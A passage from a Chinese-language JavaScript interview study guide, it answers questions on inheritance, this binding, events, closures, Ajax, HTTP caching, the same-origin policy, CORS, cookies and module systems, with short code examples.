（3）第三种方式是组合继承，组合继承是将原型链和借用构造函数组合起来使用的一种方式。通过借用构造函数的方式来实现类型的属性的继承，通过将子类型的原型设置为超类型的实例来实现方法的继承。这种方式解决了上面的两种模式单独使用时的问题，但是由于我们是以超类型的实例来作为子类型的原型，所以调用了两次超类的构造函数，造成了子类型的原型中多了很多不必要的属性。 （4）第四种方式是原型式继承，原型式继承的主要思路就是基于已有的对象来创建新的对象，实现的原理是，向函数中传入一个对象，然后返回一个以这个对象为原型的对象。这种继承的思路主要不是为了实现创造一种新的类型，只是对某个对象实现一种简单继承，ES5 中定义的 Object.create() 方法就是原型式继承的实现。缺点与原型链方式相同。 （5）第五种方式是寄生式继承，寄生式继承的思路是创建一个用于封装继承过程的函数，通过传入一个对象，然后复制一个对象的副本，然后对象进行扩展，最后返回这个对象。这个扩展的过程就可以理解是一种继承。这种继承的优点就是对一个简单对象实现继承，如果这个对象不是我们的自定义类型时。缺点是没有办法实现函数的复用。 （6）第六种方式是寄生式组合继承，组合继承的缺点就是使用超类型的实例做为子类型的原型，导致添加了不必要的原型属性。寄生式组合继承的方式是使用超类型的原型的副本来作为子类型的原型，这样就避免了创建不必要的属性。 36. 寄生式组合继承的实现？12345678910111213141516171819function Person(name) &#123; this.name = name;&#125;Person.prototype.sayName = function () &#123; console.log(\"My name is \" + this.name + \".\");&#125;function Student(name, grade) &#123; Person.call(this, name); this.grade = grade;&#125;Student.prototype = Object.create(Person.prototype);Student.prototype.constructor = Student;Student.prototype.sayMyGrade = function () &#123;console.log(\"My grade is \" + this.grade + \".\");&#125; 37. Javascript 的作用域链？ 作用域链的作用是保证对执行环境有权访问的所有变量和函数的有序访问，通过作用域链，我们可以访问到外层环境的变量和函数。 作用域链的本质上是一个指向变量对象的指针列表。变量对象是一个包含了执行环境中所有变量和函数的对象。作用域链的前端始终都是当前执行上下文的变量对象。全局执行上下文的变量对象（也就是全局对象）始终是作用域链的最后一个对象。 当我们查找一个变量时，如果当前执行环境中没有找到，我们可以沿着作用域链向后查找。 作用域链的创建过程跟执行上下文的建立有关…. 38. 谈谈 This 对象的理解。this 是执行上下文中的一个属性，它指向最后一次调用这个方法的对象。在实际开发中，this绑定有这四种方式 （1）第一种默认绑定，当一个函数不是一个对象的属性时，直接作为函数来调用时，this 指向全局对象。 （2）第二种是隐式绑定，如果一个函数作为一个对象的方法来调用时，this 指向这个对象。 （3）第三种是显式绑定： apply 、 call 和 bind 调用模式，这三个方法都可以显示的指定调用函数的 this 指向 （4）第四种是关键字new绑定：构造器调用模式，如果一个函数用 new 调用时，函数执行前会新创建一个对象，this 指向这个新创建的对象。 (5)箭头函数绑定：箭头函数的this指向创建这个箭头函数时候的环境 优先级： 5 &gt; 4 &gt; 3 &gt; 2 &gt; 1 39. eval 是做什么的？ 它的功能是把对应的字符串解析成 JS 代码并运行。 应该避免使用 eval，不安全，非常耗性能（2次，一次解析成 js 语句，一次执行）。 详细资料可以参考： 《eval()》 40. 什么是 DOM 和 BOM？ DOM 指的是文档对象模型，它指的是把文档当做一个对象来对待，这个对象主要定义了处理网页内容的方法和接口。 BOM 指的是浏览器对象模型，它指的是把浏览器当做一个对象来对待，这个对象主要定义了与浏览器进行交互的法和接口。BOM的核心是 window，而 window 对象具有双重角色，它既是通过 js 访问浏览器窗口的一个接口，又是一个 Global（全局）对象。这意味着在网页中定义的任何对象，变量和函数，都作为全局对象的一个属性或者方法存在。 window 对象含有 location 对象、navigator 对象、screen 对象等子对象，并且 DOM 的最根本的对象 document 对象也是 BOM 的 window 对象的子对象。 41. 写一个通用的事件侦听器函数。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354const EventUtils = &#123; // 视能力分别使用dom0||dom2||IE方式 来绑定事件 // 添加事件 addEvent: function (element, type, handler) &#123; if (element.addEventListener) &#123; element.addEventListener(type, handler, false); &#125; else if (element.attachEvent) &#123; element.attachEvent(\"on\" + type, handler); &#125; else &#123; element[\"on\" + type] = handler; &#125; &#125;, // 移除事件 removeEvent: function (element, type, handler) &#123; if (element.removeEventListener) &#123; element.removeEventListener(type, handler, false); &#125; else if (element.detachEvent) &#123; element.detachEvent(\"on\" + type, handler); &#125; else &#123; element[\"on\" + type] = null; &#125; &#125;, // 获取事件目标 getTarget: function (event) &#123; return event.target || event.srcElement; &#125;, // 获取 event 对象的引用，取到事件的所有信息，确保随时能使用 event getEvent: function (event) &#123; return event || window.event; &#125;, // 阻止事件（主要是事件冒泡，因为 IE 不支持事件捕获） stopPropagation: function (event) &#123; if (event.stopPropagation) &#123; event.stopPropagation(); &#125; else &#123; event.cancelBubble = true; &#125; &#125;, // 取消事件的默认行为 preventDefault: function (event) &#123; if (event.preventDefault) &#123; event.preventDefault(); &#125; else &#123; event.returnValue = false; &#125; &#125;&#125; 42. 事件是什么？IE 与火狐的事件机制有什么区别？ 如何阻止冒泡？ （1）事件是用户操作网页时发生的交互动作，比如 click/move， 事件除了用户触发的动作外，还可以是文档加载，窗口滚动和大小调整。事件被封装成一个 event 对象，包含了该事件发生时的所有相关信息（ event 的属性）以及可以对事件进行的操作（ event 的方法）。 （2）事件处理机制：IE 支持事件冒泡、Firefox 同时支持两种事件模型，也就是：事件冒泡和事件捕获。 （3）event.stopPropagation() 或者 ie 下的方法 event.cancelBubble = true; 43. 三种事件模型是什么？ 第一种事件模型是最早的 DOM0 级模型，这种模型不会传播，所以没有事件流的概念，但是现在有的浏览器支持以冒泡的方式实现，它可以在网页中直接定义监听函数，也可以通过 js 属性来指定监听函数。这种方式是所有浏览器都兼容的。 第二种事件模型是 IE 事件模型，在该事件模型中，一次事件共有两个过程，事件处理阶段，和事件冒泡阶段。事件处理阶段会首先执行目标元素绑定的监听事件。然后是事件冒泡阶段，冒泡指的是事件从目标元素冒泡到 document，依次检查经过的节点是否绑定了事件监听函数，如果有则执行。这种模型通过 attachEvent 来添加监听函数，可以添加多个监听函数，会按顺序依次执行。 第三种是 DOM2 级事件模型，在该事件模型中，一次事件共有三个过程，第一个过程是事件捕获阶段。捕获指的是事件从 document 一直向下传播到目标元素，依次检查经过的节点是否绑定了事件监听函数，如果有则执行。后面两个阶段和 IE 事件模型的两个阶段相同。这种事件模型，事件绑定的函数是 addEventListener，其中第三个参数可以指定事件是否在捕获阶段执行。 详细资料可以参考： 《一个 DOM 元素绑定多个事件时，先执行冒泡还是捕获》 44. 事件委托是什么？ 事件委托本质上是利用了浏览器事件冒泡的机制。因为事件在冒泡过程中会上传到父节点，并且父节点可以通过事件对象获取到目标节点，因此可以把子节点的监听函数定义在父节点上，由父节点的监听函数统一处理多个子元素的事件，这种方式称为事件代理。 使用事件代理我们可以不必要为每一个子元素都绑定一个监听事件，这样减少了内存上的消耗。并且使用事件代理我们还可以实现事件的动态绑定，比如说新增了一个子节点，我们并不需要单独地为它添加一个监听事件，它所发生的事件会交给父元素中的监听函数来处理。 45. [“1”, “2”, “3”].map(parseInt) 答案是多少？ parseInt() 函数能解析一个字符串，并返回一个整数，需要两个参数 (val, radix)，其中 radix 表示要解析的数字的基数。（该值介于 2 ~ 36 之间，并且字符串中的数字不能大于 radix 才能正确返回数字结果值）。 此处 map 传了 3 个参数 (element, index, array)，默认第三个参数被忽略掉，因此三次传入的参数分别为”1-0”, “2-1”, “3-2”因为字符串的值不能大于基数，因此后面两次调用均失败，返回 NaN ，第一次基数为 0 ，按十进制解析返回 1。 46. 什么是闭包，为什么要用它？ 闭包是指有权访问另一个函数作用域中变量的函数，创建闭包的最常见的方式就是在一个函数内创建另一个函数，创建的函数可以访问到当前函数的局部变量。 闭包有两个常用的用途。 闭包的第一个用途是使我们在函数外部能够访问到函数内部的变量。通过使用闭包，我们可以通过在外部调用闭包函数，从而在外部访问到函数内部的变量，可以使用这种方法来创建私有变量。 函数的另一个用途是使已经运行结束的函数上下文中的变量对象继续留在内存中，因为闭包函数保留了这个变量对象的引用，所以这个变量对象不会被回收。 其实闭包的本质就是作用域链的一个特殊的应用，只要了解了作用域链的创建过程，就能够理解闭包的实现原理。 详细资料可以参考： 《JavaScript 深入理解之闭包》 47. javascript 代码中的 “use strict”; 是什么意思 ? 使用它区别是什么？ 相关知识点： use strict 是一种 ECMAscript5 添加的（严格）运行模式，这种模式使得 Javascript 在更严格的条件下运行。 设立”严格模式”的目的，主要有以下几个： 消除 Javascript 语法的一些不合理、不严谨之处，减少一些怪异行为; 消除代码运行的一些不安全之处，保证代码运行的安全； 提高编译器效率，增加运行速度； 为未来新版本的 Javascript 做好铺垫。 代表了 js 一种更合理、更安全、更严谨的发展方向。 区别 (1）禁止使用 with 语句。（2）禁止 this 关键字指向全局对象。（3）对象不能有重名的属性。 《Javascript 严格模式详解》 48. 如何判断一个对象是否属于某个类？ 第一种方式是使用 instanceof 运算符来判断构造函数的 prototype 属性是否出现在对象的原型链中的任何位置。 第二种方式可以通过对象的 constructor 属性来判断，对象的 constructor 属性指向该对象的构造函数，但是这种方式不是很安全，因为 constructor 属性可以被改写。 第三种方式，如果需要判断的是某个内置的引用类型的话，可以使用 Object.prototype.toString() 方法来打印对象的 [[Class]] 属性来进行判断。 49. instanceof 的作用？instanceof 运算符用于判断构造函数的 prototype 属性是否出现在对象的原型链中的任何位置。 实现：1234567891011function myInstanceof(left, right) &#123; let proto = Object.getPrototypeOf(left), // 获取对象的原型 prototype = right.prototype; // 获取构造函数的 prototype 对象 // 判断构造函数的 prototype 对象是否在对象的原型链上 while (true) &#123; if (!proto) return false; if (proto === prototype) return true proto = Object.getPrototypeOf(proto); &#125;&#125; 50. new 操作符具体干了什么呢？如何实现？ （1）首先创建了一个新的空对象（2）设置原型，将对象的原型设置为函数的 prototype 对象。（3）让函数的 this 指向这个对象，执行构造函数的代码（为这个新对象添加属性）（4）判断函数的返回值类型，如果是值类型，返回创建的对象。如果是引用类型，就返回这个引用类型的对象。 实现:123456789101112131415161718192021222324252627function objectFactory() &#123;let newObject = null,constructor = Array.prototype.shift.call(arguments),result = null;// 参数判断if (typeof constructor !== \"function\") &#123;console.error(\"type error\");return;&#125;;// 新建一个空对象，对象的原型为构造函数的 prototype 对象newObject = Object.create(constructor.prototype);// 将 this 指向新建对象，并执行函数result = constructor.apply(newObject, arguments);// 判断返回对象let flag = result &amp;&amp; (typeof result === \"object\" || typeof result === \"function\");// 判断返回结果return flag ? result : newObject;&#125;// 使用方法objectFactory(构造函数,初始化参数) 详细资料可以参考： 《new 操作符具体干了什么？》 《JavaScript 深入之 new 的模拟实现》 51. Javascript中，有一个函数，执行时对象查找时，永远不会去查找原型，这个函数是？hasOwnProperty 所有继承了 Object 的对象都会继承到 hasOwnProperty 方法。这个方法可以用来检测一个对象是否含有特定的自身属性，和in 运算符不同，该方法会忽略掉那些从原型链上继承到的属性。 52. 对于 JSON 的了解？ JSON 是一种基于文本的轻量级的数据交换格式。它可以被任何的编程语言读取和作为数据格式来传递。 在项目开发中，我们使用 JSON 作为前后端数据交换的方式。在前端我们通过将一个符合 JSON 格式的数据结构序列化为 JSON字符串，然后将它传递到后端，后端通过 JSON 格式的字符串解析后生成对应的数据结构，以此来实现前后端数据的一个传递。 因为 JSON 的语法是基于 js 的，因此很容易将 JSON 和 js 中的对象弄混，但是我们应该注意的是 JSON 和 js 中的对象不是一回事，JSON 中对象格式更加严格，比如说在 JSON 中属性值不能为函数，不能出现 NaN 这样的属性值等，因此大多数的js对象是不符合 JSON 对象的格式的。 在 js 中提供了两个函数来实现 js 数据结构和 JSON 格式的转换处理，一个是 JSON.stringify 函数，通过传入一个符合JSON 格式的数据结构，将其转换为一个 JSON 字符串。如果传入的数据结构不符合 JSON 格式，那么在序列化的时候会对这些值进行对应的特殊处理，使其符合规范。在前端向后端发送数据时，我们可以调用这个函数将数据对象转化为 JSON 格式的字符串。 另一个函数 JSON.parse() 函数，这个函数用来将 JSON 格式的字符串转换为一个 js 数据结构，如果传入的字符串不是标准的 JSON 格式的字符串的话，将会抛出错误。当我们从后端接收到 JSON 格式的字符串时，我们可以通过这个方法来将其解析为一个 js 数据结构，以此来进行数据的访问。 53. [].forEach.call($$(““),function(a){a.style.outline=”1px solid #”+(~~(Math.random()(1&lt;&lt;24))).toString(16)}) 能解释一下这段代码的意思吗？ 1234567891011（1）选取页面所有 DOM 元素。在浏览器的控制台中可以使用$$()方法来获取页面中相应的元素，这是现代浏览器提供的一个命 令行 API 相当于 document.querySelectorAll 方法。（2）循环遍历 DOM 元素（3）给元素添加 outline 。由于渲染的 outline 是不在 CSS 盒模型中的，所以为元素添加 outline 并不会影响元素的 大小和页面的布局。（4）生成随机颜色函数。Math.random()*(1&lt;&lt;24) 可以得到 0~2^24 - 1 之间的随机数，因为得到的是一个浮点数，但我 们只需要整数部分，使用取反操作符 ~ 连续两次取反获得整数部分，然后再用 toString(16) 的方式，转换为一个十六 进制的字符串。 详细资料可以参考： 《通过一行代码学 JavaScript》 54. js 延迟加载的方式有哪些？ 第一种方式是我们一般采用的是将 js 脚本放在文档的底部，来使 js 脚本尽可能的在最后来加载执行。 第二种方式是给 js 脚本添加 defer 属性，这个属性会让脚本的加载与文档的解析同步解析，然后在文档解析完成后再执行这个脚本文件，这样的话就能使页面的渲染不被阻塞。多个设置了 defer 属性的脚本按规范来说最后是顺序执行的，但是在一些浏览器中可能不是这样。 第三种方式是给 js 脚本添加 async 属性，这个属性会使脚本异步加载，不会阻塞页面的解析过程，但是当脚本加载完成后立即执行 js 脚本，这个时候如果文档没有解析完成的话同样会阻塞。多个 async 属性的脚本的执行顺序是不可预测的，一般不会按照代码的顺序依次执行。 第四种方式是动态创建 DOM 标签的方式，我们可以对文档的加载事件进行监听，当文档加载完成后再动态的创建 script 标签来引入 js 脚本。 55. Ajax 是什么? 如何创建一个Ajax？ 我对 ajax 的理解是，它是一种异步通信的方法，通过直接由 js 脚本向服务器发起 http 通信，然后根据服务器返回的数据，更新网页的相应部分，而不用刷新整个页面的一种方法。 创建一个 ajax 有这样几个步骤 首先是创建一个 XMLHttpRequest 对象。 然后在这个对象上使用 open 方法创建一个 http 请求，open 方法所需要的参数是请求的方法、请求的地址、是否异步和用户的认证信息。 在发起请求前，我们可以为这个对象添加一些信息和监听函数。比如说我们可以通过 setRequestHeader 方法来为请求添加头信息。我们还可以为这个对象添加一个状态监听函数。一个 XMLHttpRequest 对象一共有 5 个状态，当它的状态变化时会触发onreadystatechange 事件，我们可以通过设置监听函数，来处理请求成功后的结果。当对象的 readyState 变为 4 的时候，代表服务器返回的数据接收完成，这个时候我们可以通过判断请求的状态，如果状态是 2xx 或者 304 的话则代表返回正常。这个时候我们就可以通过 response 中的数据来对页面进行更新了。 promise封装实现：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465function getJSON(option) &#123; let url = option.url let method = option.method.toLocaleLowerCase() let data = option.data let paramArr = [] let encodeData // 创建一个 promise 对象 let promise = new Promise(function (resolve, reject) &#123; let xhr = new XMLHttpRequest(); //为请求添加参数 if (data instanceof Object) &#123; for (let key in data) &#123; // 参数拼接需要通过 encodeURIComponent 进行编码 paramArr.push( encodeURIComponent(key) + '=' + encodeURIComponent(data[key]) ) &#125; encodeData = paramArr.join('&amp;') &#125; //如果是GET请求，需要给url添加一个？ if (method === 'get') &#123; // 检测 url 中是否已存在 ? 及其位置 const index = url.indexOf('?') if (index === -1) url += '?' else if (index !== url.length -1) url += '&amp;' // 拼接 url url += encodeData &#125; // 新建一个 http 请求 xhr.open(method, url, true); // 设置状态的监听函数 xhr.onreadystatechange = function () &#123; if (this.readyState === 4)&#123; // 当请求成功或失败时，改变 promise 的状态 if (this.status === 200) &#123; resolve(this.response); &#125; else &#123; reject(new Error(this.statusText)); &#125; &#125; &#125; // 设置错误监听函数 xhr.onerror = function () &#123; reject(new Error(this.statusText)); &#125; xhr.ontimeout = function()&#123; reject('请求超时') &#125; // 设置响应的数据类型 xhr.responseType = \"json\"; // 设置请求头信息 xhr.setRequestHeader(\"Accept\", \"*/*\") // 发送 http 请求 if (method === 'get') xhr.send(null) else &#123; // post 方式需要设置请求头 xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded;charset=UTF-8') xhr.send(encodeData) &#125; &#125;) return promise;&#125; 56. 浏览器的disk缓存机制？ 浏览器的硬盘缓存机制，也就是常说的http缓存，指的是通过在一段时间内保留已接收到的 web 资源的一个副本，如果在资源的有效时间内，发起了对这个资源的再一次请求，那么浏览器会直接使用缓存的副本，而不是向服务器发起请求。使用 web 缓存可以有效地提高页面的打开速度，减少不必要的网络带宽的消耗。 web 资源的缓存策略一般由服务器来指定，可以分为两种，分别是强缓存策略和协商缓存策略。 强缓存 使用强缓存策略时，如果缓存资源有效，则直接使用缓存资源，不必再向服务器发起请求。强缓存策略可以通过两种方式来设置，分别是 http 头信息中的 Expires 属性和 Cache-Control 属性。 服务器通过在响应头中添加 Expires 属性，来指定资源的过期时间。在过期时间以内，该资源可以被缓存使用，不必再向服务器发送请求。这个时间是一个绝对时间，它是服务器的时间，因此可能存在这样的问题，就是客户端的时间和服务器端的时间不一致，或者用户可以对客户端时间进行修改的情况，这样就可能会影响缓存命中的结果。 Expires 是 http1.0 中的方式，因为它的一些缺点，在 http 1.1 中提出了一个新的头部属性就是 Cache-Control 属性， 它提供了对资源的缓存的更精确的控制。它有很多不同的值，常用的比如我们可以通过设置 max-age 来指定资源能够被缓存的时间的大小，这是一个相对的时间，它会根据这个时间的大小和资源第一次请求时的时间来计算出资源过期的时间，因此相对于 Expires来说，这种方式更加有效一些。 其他的字段还有如 no-store ，用来指定资源不能够被缓存（包括memory cache）。no-cache 代表该资源能够被缓存，但是立即失效，每次都需要向服务器发起请求。 一般来说只需要设置其中一种方式就可以实现强缓存策略，当两种方式一起使用时，Cache-Control 的优先级要高于 Expires 。 协商缓存 使用协商缓存策略时，会先向服务器发送一个请求，如果资源没有发生修改，则返回一个 304 状态，让浏览器使用本地的缓存副本。如果资源发生了修改，则返回修改后的资源。协商缓存也可以通过两种方式来设置，分别是 http 头信息中的 Etag 和 Last-Modified 属性。 服务器通过在响应头中添加 Last-Modified 属性来指出资源最后一次修改的时间，当浏览器下一次发起请求时，会在请求头中添加一个 If-Modified-Since 的属性，属性值为上一次资源返回时的 Last-Modified 的值。当请求发送到服务器后服务器会通过这个属性来和资源的最后一次的修改时间来进行比较，以此来判断资源是否做了修改。如果资源没有修改，那么返回 304 状态，让客户端使用本地的缓存。如果资源已经被修改了，则返回修改后的资源。 使用这种方法有一个缺点，就是 Last-Modified 标注的最后修改时间只能精确到秒级，如果某些文件在1秒钟以内，被修改多次的话，那么文件已将改变了但是 Last-Modified 却没有改变，这样会造成缓存命中的不准确。 因为 Last-Modified 的这种可能发生的不准确性，http 中提供了另外一种方式，那就是 Etag 属性。服务器在返回资源的时候，在头信息中添加了 Etag 属性，这个属性是资源生成的唯一标识符，当资源发生改变的时候，这个值也会发生改变。在下一次资源请求时，浏览器会在请求头中添加一个 If-None-Match 属性，这个属性的值就是上次返回的资源的 Etag 的值。服务接收到请求后会根据这个值来和资源当前的 Etag 的值来进行比较，以此来判断资源是否发生改变，是否需要返回资源。通过这种方式，比 Last-Modified 的方式更加精确。 当 Last-Modified 和 Etag 属性同时出现的时候，Etag 的优先级更高。使用协商缓存的时候，服务器需要考虑负载平衡的问题，因此多个服务器上资源的 Last-Modified 应该保持一致，因为每个服务器上 Etag 的值都不一样，因此在考虑负载平衡时，最好不要设置 Etag 属性。 57. Ajax 解决浏览器缓存问题？ （1）在 ajax 发送请求前加上 anyAjaxObj.setRequestHeader(“If-Modified-Since”,”0”)。 （2）在 ajax 发送请求前加上 anyAjaxObj.setRequestHeader(“Cache-Control”,”no-cache”)。 （3）在 URL 后面加上一个随机数： “fresh=” + Math.random();。 （4）在 URL 后面加上时间戳：”nowtime=” + new Date().getTime();。 58. 同步和异步的区别？ 同步指的是当一个进程在执行某个请求的时候，如果这个请求需要等待一段时间才能返回，那么这个进程会一直等待下去，直到消息返回为止再继续向下执行。 异步指的是当一个进程在执行某个请求的时候，如果这个请求需要等待一段时间才能返回，这个时候进程会继续往下执行，不会阻塞等待消息的返回，当消息返回时系统再通知进程进行处理。 59. 什么是浏览器的同源政策？ 浏览器的同源限制策略是指：一个域下的 js 脚本在未经允许的情况下，不能够访问另一个域的内容。 这里的同源的指的是两个域的协议、域名、端口号必须相同，否则则不属于同一个域。 同源政策主要限制了三个方面 第一个是当前域下的 js 脚本不能够访问其他域下的 cookie、localStorage 和 indexDB。 第二个是当前域下的 js 脚本不能够操作访问操作其他域下的 DOM。 第三个是当前域下 ajax 无法发送跨域请求。 60. 如何解决跨域问题？解决跨域的方法我们可以根据我们想要实现的目的来划分。 首先我们如果只是想要实现主域名下的不同子域名的跨域操作，我们可以使用设置 document.domain 来解决。 （1）将 document.domain 设置为主域名，来实现相同子域名的跨域操作，这个时候主域名下的 cookie 就能够被子域名所访问。同时如果文档中含有主域名相同，子域名不同的 iframe 的话，我们也可以对这个 iframe 进行操作。 如果是想要解决不同跨域窗口间的通信问题，比如说一个页面想要和页面的中的不同源的 iframe 进行通信的问题，我们可以使用location.hash 或者 window.name 或者 postMessage 来解决。 （2）使用 location.hash 的方法，我们可以在主页面动态的修改 iframe 窗口的 hash 值，然后在 iframe 窗口里实现监听函数来实现这样一个单向的通信。因为在 iframe 是没有办法访问到不同源的父级窗口的，所以我们不能直接修改父级窗口的hash 值来实现通信，我们可以在 iframe 中再加入一个 iframe ，这个 iframe 的内容是和父级页面同源的，所以我们可以 window.parent.parent 来修改最顶级页面的 src，以此来实现双向通信。 （3）使用 window.name 的方法，主要是基于同一个窗口中设置了 window.name 后不同源的页面也可以访问，所以不同源的子页面可以首先在 window.name 中写入数据，然后跳转到一个和父级同源的页面。这个时候级页面就可以访问同源的子页面中 window.name 中的数据了，这种方式的好处是可以传输的数据量大。 （4）使用 postMessage 来解决的方法，这是一个 h5 中新增的一个 api。通过它我们可以实现多窗口间的信息传递，通过获取到指定窗口的引用，然后调用 postMessage 来发送信息，在窗口中我们通过对 message 信息的监听来接收信息，以此来实现不同源间的信息交换。 如果是像解决 ajax 无法提交跨域请求的问题，我们可以使用 jsonp、cors、websocket 协议、服务器代理来解决问题。 （5）使用 jsonp 来实现跨域请求，它的主要原理是通过动态构建 script 标签来实现跨域请求，因为浏览器对 script 标签的引入没有跨域的访问限制 。通过在请求的 url 后指定一个回调函数，然后服务器在返回数据的时候，构建一个 json 数据的包装，这个包装就是回调函数，然后返回给前端，前端接收到数据后，因为请求的是脚本文件，所以会直接执行，这样我们先前定义好的回调函数就可以被调用，从而实现了跨域请求的处理。这种方式只能用于 get 请求。 （6）使用 CORS 的方式，CORS 是一个 W3C 标准，全称是”跨域资源共享”。CORS 需要浏览器和服务器同时支持。目前，所有浏览器都支持该功能，因此我们只需要在服务器端配置就行。 （7）使用 websocket 协议，这个协议没有同源限制。 （8）使用服务器来代理跨域的访问请求，就是有跨域的请求操作时发送请求给后端，让后端代为请求，然后最后将获取的结果发返\\回。 CORS简单请求 浏览器将 CORS 请求分成两类：简单请求和非简单请求。对于简单请求，浏览器直接发出 CORS 请求。具体来说，就是会在头信息之中，增加一个 Origin 字段。Origin 字段用来说明本次请求来自哪个源。服务器根据这个值，决定是否同意这次请求。对于如果 Origin 指定的源，不在许可范围内，服务器会返回一个正常的 HTTP 回应。浏览器发现，这个回应的头信息没有包含 Access-Control-Allow-Origin 字段，就知道出错了，从而抛出一个错误，ajax 不会收到响应信息。如果成功的话会包含一些以 Access-Control- 开头的字段。 CORS非简单请求 非简单请求，浏览器会先发出一次预检请求，来判断该域名是否在服务器的白名单中，如果收到肯定回复后才会发起请求。 预检请求 对于复杂请求，浏览器会自动发出一个OPTIONS请求来检测本次请求是否被服务器接受。一个OPTIONS请求一般会携带下面两个与CORS相关的头： Access-Control-Request-Method : 本次预检请求的请求方法。 Access-Control-Request-Headers：本次请求所携带的自定义首部字段。这些字段是导致产生OPTIONS请求的一个原因 这样，服务端收到该预检请求后，会返回与CORS相关的响应头。主要会包括下面几个，但可能还会有其他的有关CORS字段： Access-Control-Allow-Origin: 服务器允许的跨域请求源 Access-Control-Allow-Methods: 服务器允许的请求方法 Access-Control-Allow-Headers : 服务器允许的自定义的请求首部字段 需要注意的是： 1、在上面的两次请求中，预检请求只是一个检查的过程，它不会携带任何请求的参数；预检通过后的请求才会真正的携带请求参数与服务器进行数据通信。 2、若服务器对预检请求没有任何响应，那么浏览器不知道服务器是否支持CORS而不会发送后续的实际请求；或者服务器不支持当前的Origin跨域访问也不会发送后续请求。 发生预检请求的条件——简单请求 请求方法是GET、POST、HEAD其中任意一个 必须是下面定义对CORS安全的首部字段集合，不能是集合之外的其他首部字段。Accept、Accept-Language、Content-Language、Content-Type、DPR、Downlink、Save-Data、Viewport-Width、Width。 Content-Type的值必须是text/plain、multipart/form-data、application/x-www-form-urlencoded中任意一个值 《为什么 form 表单提交没有跨域问题，但 ajax 提交有跨域问题？》 61. 服务器代理转发时，该如何处理 cookie？ 详细资料可以参考： 《深入浅出 Nginx》 62. 简单谈一下 cookie ？ 我的理解是 cookie 是服务器提供的一种用于维护会话状态信息的数据，通过服务器发送到浏览器，浏览器保存在本地，当下一次有同源的请求时，将保存的 cookie 值添加到请求头部，发送给服务端。这可以用来实现记录用户登录状态等功能。cookie 一般可以存储 4k 大小的数据，并且只能够被同源的网页所共享访问。 服务器端可以使用 Set-Cookie 的响应头部来配置 cookie 信息。一条 cookie 包括了5个属性值 expires、domain、path、secure、HttpOnly。其中 expires 指定了 cookie 失效的时间，domain 是域名、path是路径，domain 和 path 一起限制了 cookie 能够被哪些 url 访问。secure 规定了 cookie 只能在确保安全的情况下传输，HttpOnly 规定了这个 cookie只能被服务器访问，不能使用 js 脚本访问。 在发生 xhr 的跨域请求的时候，即使是同源下的 cookie，也不会被自动添加到请求头部，除非显示地规定。 详细资料可以参考： 《HTTP cookies》 《聊一聊 cookie》 63. 模块化开发怎么做？ 我对模块的理解是，一个模块是实现一个特定功能的一组方法。在最开始的时候，js 只实现一些简单的功能，所以并没有模块的概念，但随着程序越来越复杂，代码的模块化开发变得越来越重要 JS模块化的过程 由于函数具有独立作用域的特点，最原始的写法是使用函数来作为模块，几个函数作为一个模块，但是这种方式容易造成全局变量的污染，并且模块间没有联系。 后面提出了对象写法，通过将函数作为一个对象的方法来实现，这样解决了直接使用函数作为模块的一些缺点，但是这种办法会暴露所有的所有的模块成员，外部代码可以修改内部属性的值。 现在最常用的是立即执行函数的写法，通过利用闭包来实现模块私有作用域的建立，同时不会对全局作用域造成污染 64. js 的几种模块规范？js 中现在比较成熟的有四种模块加载方案。 第一种是 CommonJS 方案，它通过 require 来引入模块，通过 module.exports 定义模块的输出接口。这种模块加载方案是服务器端的解决方案，它是以同步的方式来引入模块的，因为在服务端文件都存储在本地磁盘，所以读取非常快，所以以同步的方式加载没有问题。但如果是在浏览器端，由于模块的加载是使用网络请求，因此使用异步加载的方式更加合适。 第二种是 AMD 方案，这种方案采用异步加载的方式来加载模块，模块的加载不影响后面语句的执行，所有依赖这个模块的语句都定义在一个回调函数里，等到加载完成后再执行回调函数。require.js 实现了 AMD 规范。 第三种是 CMD 方案，这种方案和 AMD 方案都是为了解决异步模块加载的问题，sea.js 实现了 CMD 规范。它和 require.js的区别在于模块定义时对依赖的处理不同和对依赖模块的执行时机的处理不同。 第四种方案是 ES6 提出的方案，使用 import 和 export 的形式来导入导出模块。这种方案和上面三种方案都不同。参考 61。 65. AMD 和 CMD 规范的区别？它们之间的主要区别有两个方面。 （1）第一个方面是在模块定义时对依赖的处理不同。AMD 推崇依赖前置，在定义模块的时候就要声明其依赖的模块。而 CMD 推崇就近依赖，只有在用到某个模块的时候再去 require。 （2）第二个方面是对依赖模块的执行时机处理不同。首先 AMD 和 CMD 对于模块的加载方式都是异步加载，不过它们的区别在于模块的执行时机，AMD 在依赖模块加载完成后就直接执行依赖模块，依赖模块的执行顺序和我们书写的顺序不一定一致。而 CMD在依赖模块加载完成后并不执行，只是下载而已，等到所有的依赖模块都加载好后，进入回调函数逻辑，遇到 require 语句的时候才执行对应的模块，这样模块的执行顺序就和我们书写的顺序保持一致了。1234567891011121314151617// CMDdefine(function(require, exports, module) &#123; var a = require('./a') a.doSomething() // 此处略去 100 行 var b = require('./b') // 依赖可以就近书写 b.doSomething() // ...&#125;)// AMD 默认推荐define(['./a', './b'], function(a, b) &#123; // 依赖必须一开始就写好 a.doSomething() // 此处略去 100 行 b.doSomething() // ...&#125;) 66. ES6 模块与 CommonJS 模块、AMD、CMD 的差异。 （1）CommonJS 模块输出的是一个值的拷贝，ES6 模块输出的是值的引用。CommonJS 模块输出的是值的拷贝，也就是说，一旦输出一个值，模块内部的变化就影响不到这个值。ES6 模块的运行机制与 CommonJS 不一样。JS 引擎对脚本静态分析的时候，遇到模块加载命令 import，就会生成一个只读引用。等到脚本真正执行时，再根据这个只读引用，到被加载的那个模块里面去取值。 （2）CommonJS 模块是运行时加载，ES6 模块是编译时输出接口。CommonJS 模块就是对象，即在输入时是先加载整个模块，生成一个对象，然后再从这个对象上面读取方法，这种加载称为“运行时加载”。而 ES6 模块不是对象，它的对外接口只是一种静态定义，在代码静态解析阶段就会生成。 67. requireJS 的核心原理是什么？（如何动态加载的？如何避免多次加载的？如何 缓存的？） require.js 的核心原理是通过动态创建 script 脚本来异步引入模块，然后对每个脚本的 load 事件进行监听，如果每个脚本都加载完成了，再调用回调函数。 《从 RequireJs 源码剖析脚本加载原理》 68. JS 模块加载器的轮子怎么造，也就是如何实现一个模块加载器？ 详细资料可以参考： 《JS 模块加载器加载原理是怎么样的？》 69. ECMAScript6 怎么写 class，为什么会出现 class 这种东西? 在我看来 ES6 新添加的 class 只是为了补充 js 